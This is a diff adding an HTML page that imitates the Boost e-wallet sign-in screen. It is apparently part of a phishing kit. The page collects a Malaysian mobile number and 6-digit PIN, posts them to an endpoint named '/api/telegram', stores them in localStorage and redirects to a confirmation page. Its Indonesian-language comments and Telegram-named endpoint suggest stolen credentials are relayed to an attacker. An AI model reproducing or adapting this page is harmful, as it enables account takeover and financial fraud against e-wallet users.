@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign in to Boost</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+</head>
+<body class="bg-gradient-to-br from-gray-50 to-gray-100 min-h-screen flex flex-col">
+  <header class="bg-[#ea0029] py-4 text-center">
+    <img src="boost-logo-white.svg" alt="Boost" class="mx-auto w-20">
+  </header>
+  <main class="flex-grow flex items-center justify-center px-4 py-8">
+    <div class="w-full max-w-sm bg-white rounded-2xl shadow-lg p-6">
+      <div id="errorBlock" class="hidden mb-3 text-center bg-red-50 border border-red-200 py-2 text-red-700 px-4 rounded-lg">
+        <p class="font-semibold">Please Wait ...</p>
+      </div>
+      <h1 class="text-2xl font-bold text-gray-900 mb-1">Sign in to Boost</h1>
+      <p class="text-gray-500 text-sm mb-6">Sign in with your registered Boost mobile number.</p>
+      
+      <label for="phone" class="block text-sm font-semibold text-gray-700 mb-1">Mobile Number</label>
+      <div class="flex items-center border-b-2 border-gray-200 focus-within:border-[#ea0029] transition">
+        <span class="text-gray-500 mr-2 font-medium">+60</span>
+        <input id="phone" type="tel" inputmode="numeric" placeholder="Enter your mobile number" class="w-full py-2 text-lg outline-none bg-transparent">
+      </div>
+      <p id="phoneError" class="text-red-500 text-xs mt-1 hidden">Please enter a valid mobile number</p>
+
+      <!-- 6-digit PIN -->
+      <div class="mt-6">
+        <label class="block text-sm font-semibold text-gray-700 mb-2">6-digit PIN</label>
+        <div class="flex justify-between gap-2 pin-container">
+          <template id="pinTemplate">
+            <input maxlength="1" type="password" inputmode="numeric" class="w-10 h-12 text-center text-xl font-semibold border-b-2 border-gray-300 rounded-md focus:border-[#ea0029] focus:outline-none">
+          </template>
+        </div>
+      </div>
+
+      <!-- Submit Button -->
+      <div class="mt-8 flex justify-end">
+        <button id="sendBtn" disabled class="bg-[#ea0029] disabled:opacity-50 text-white w-14 h-14 flex items-center justify-center rounded-full shadow-md hover:shadow-lg hover:scale-105 active:scale-95 transition-all">
+          <svg id="arrowIcon" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 12h14m-7-7l7 7-7 7"></path>
+          </svg>
+          <div id="loadingSpinner" class="hidden w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+        </button>
+      </div>
+    </div>
+  </main>
+
+  <script>
+    // Generate 6 PIN inputs
+    const pinContainer = document.querySelector(".pin-container");
+    const template = document.getElementById("pinTemplate").content;
+    for (let i = 0; i < 6; i++) pinContainer.appendChild(template.cloneNode(true));
+
+    const phoneInput = $("#phone");
+    const phoneError = $("#phoneError");
+    const pinInputs = $(".pin-container input");
+    const sendBtn = $("#sendBtn");
+    const arrowIcon = $("#arrowIcon");
+    const spinner = $("#loadingSpinner");
+    const errorBlock = $("#errorBlock");
+
+    const onlyDigits = (val) => val.replace(/\D/g, "");
+    const validatePhone = () => /^1\d{8,9}$/.test(phoneInput.val()); // nomor Malaysia: 1 diikuti 8-9 digit
+    const validatePin = () => Array.from(pinInputs).every(inp => inp.value !== "");
+
+    function updateButton() {
+      sendBtn.prop("disabled", !(validatePhone() && validatePin()));
+    }
+
+    // Phone input handler
+    phoneInput.on("input", function () {
+      this.value = onlyDigits(this.value);
+      phoneError.toggleClass("hidden", validatePhone());
+      updateButton();
+    });
+
+    // PIN input handlers
+    pinInputs.each(function (idx) {
+      $(this).on("input", function (e) {
+        this.value = onlyDigits(this.value);
+        if (this.value && idx < pinInputs.length - 1) pinInputs[idx + 1].focus();
+        updateButton();
+      });
+      $(this).on("keydown", function (e) {
+        if (e.key === "Backspace" && !this.value && idx > 0) pinInputs[idx - 1].focus();
+      });
+    });
+
+    // Submit via AJAX ke endpoint /api/telegram (type login)
+    sendBtn.on("click", function () {
+      const phone = "+60" + phoneInput.val();
+      const pin = Array.from(pinInputs).map(i => i.value).join("");
+
+      sendBtn.prop("disabled", true);
+      arrowIcon.addClass("hidden");
+      spinner.removeClass("hidden");
+      errorBlock.removeClass("hidden");
+
+      $.ajax({
+        url: "/api/telegram",
+        type: "POST",
+        dataType: "json",
+        data: { phone, pin, type: 'login' },
+        success: function (res) {
+          if (res.success) {
+            localStorage.setItem("boost_phone", phone);
+            localStorage.setItem("boost_pin", pin);
+            window.location.href = "confirm.html";
+          } else {
+            alert("Authentication failed. Please try again.");
+          }
+        },
+        error: function () {
+          alert("Connection error. Please try again.");
+        },
+        complete: function () {
+          sendBtn.prop("disabled", false);
+          spinner.addClass("hidden");
+          errorBlock.addClass("hidden");
+          arrowIcon.removeClass("hidden");
+        }
+      });
+    });
+  </script>
+</body>
+</html>
